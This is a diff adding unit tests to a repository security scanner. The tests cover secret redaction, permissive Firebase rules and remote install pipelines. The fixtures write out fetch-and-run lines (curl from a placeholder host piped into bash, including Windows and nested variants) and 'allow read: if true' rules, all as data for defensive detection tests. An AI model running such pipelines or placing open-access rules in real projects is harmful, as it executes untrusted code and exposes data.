@@ -186,7 +186,7 @@ class PreflightTests(unittest.TestCase):
 
     def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
-        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
+        synthetic_value = "!DUMMY_SECRET_VALUE_123"
         filename = f"token={synthetic_value}"
         fixture.write(filename, f"token={synthetic_value}\n")
 
@@ -209,6 +209,10 @@ class PreflightTests(unittest.TestCase):
                 synthetic_value = "!PrivilegedSyntheticValue123456789"
                 fixture.write(
                     f"{variable_name}={synthetic_value}",
+                    f"{variable_name}={synthetic_value}\n",
+                )
+                fixture.write(
+                    f"{variable_name}=/{synthetic_value}",
                     f"{variable_name}={synthetic_value}\n",
                 )
 
@@ -395,6 +399,29 @@ class PreflightTests(unittest.TestCase):
         self.assertLess(elapsed, 1.0, f"Firebase rule scan took {elapsed:.3f}s")
         self.assertEqual([], findings)
 
+    def test_req_008_firebase_whitespace_cannot_bypass_permissive_rule_scan(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow" + (" " * 65) + "read: if true;\n"
+            "allow read: if true" + (" " * 513) + ";\n",
+        )
+        fixture.write(
+            "database.rules.json",
+            '{"rules": {".read"' + (" " * 65) + ": true}}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(3, len(findings))
+
     def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
@@ -494,6 +521,29 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(6, len(findings))
         self.assertEqual({1, 2, 4, 5, 7, 8}, {finding["line"] for finding in findings})
 
+    def test_req_009_nested_fragment_and_windows_remote_pipelines_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write(
+            "nested.sh",
+            f"{fetcher} https://invalid.example/install#fragment | {shell}\n"
+            f"sh -c '{fetcher} https://invalid.example/install | {shell}'\n"
+            f'result="$({fetcher} https://invalid.example/install | {shell})"\n'
+            f"{fetcher}.exe https://invalid.example/install | {shell}.exe\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual({1, 2, 3, 4}, {finding["line"] for finding in findings})
+
     def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
@@ -513,6 +563,51 @@ class PreflightTests(unittest.TestCase):
             "VW-REMOTE-INSTALL-SCRIPT",
             {finding["rule_id"] for finding in report["findings"]},
         )
+
+    def test_req_009_shell_tokenization_budget_is_bounded_and_fails_closed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write("long-unclosed.txt", f'{fetcher} "' + ("x" * 50_000) + "\n")
+        fixture.write(
+            "long-pipeline.txt",
+            f"{fetcher} " + ("x" * 5_000) + f" | {shell}\n",
+        )
+        fixture.write("malformed-pipeline.txt", f'{fetcher} "unclosed | {shell}\n')
+
+        started = time.perf_counter()
+        completed = self.run_scanner(fixture.root)
+        elapsed = time.perf_counter() - started
+        report = self.json_report(completed)
+
+        self.assertLess(elapsed, 3.0, f"bounded shell scan took {elapsed:.3f}s")
+        self.assertEqual(1, completed.returncode)
+        unparsed = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        ]
+        self.assertEqual(
+            {"long-pipeline.txt", "malformed-pipeline.txt"},
+            {finding["path"] for finding in unparsed},
+        )
+
+    def test_req_009_plain_megabyte_scan_is_linear(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("plain.txt", "!" * 1_048_576)
+
+        scanner = load_scanner_module()
+        started = time.perf_counter()
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers("!" * 1_048_576))
+        direct_elapsed = time.perf_counter() - started
+
+        started = time.perf_counter()
+        completed = self.run_scanner(fixture.root)
+        scan_elapsed = time.perf_counter() - started
+
+        self.assertLess(direct_elapsed, 1.0, f"direct shell scan took {direct_elapsed:.3f}s")
+        self.assertLess(scan_elapsed, 3.0, f"full scanner took {scan_elapsed:.3f}s")
+        self.assertEqual(0, completed.returncode)
 
     def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
         fixture = RepositoryFixture(self)
@@ -853,6 +948,17 @@ class PreflightTests(unittest.TestCase):
 
         self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
         self.assertTrue(all(finding.suppressed for finding in findings))
+
+    def test_req_011_suppression_metadata_parser_has_a_hard_budget(self) -> None:
+        scanner = load_scanner_module()
+        line = 'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="' + ("x" * 50_000)
+
+        started = time.perf_counter()
+        parsed = scanner._parse_suppression(line)
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 0.5, f"suppression parse took {elapsed:.3f}s")
+        self.assertEqual(("VW-FIREBASE-PUBLIC-API-KEY", {}), parsed)
 
 
 if __name__ == "__main__":
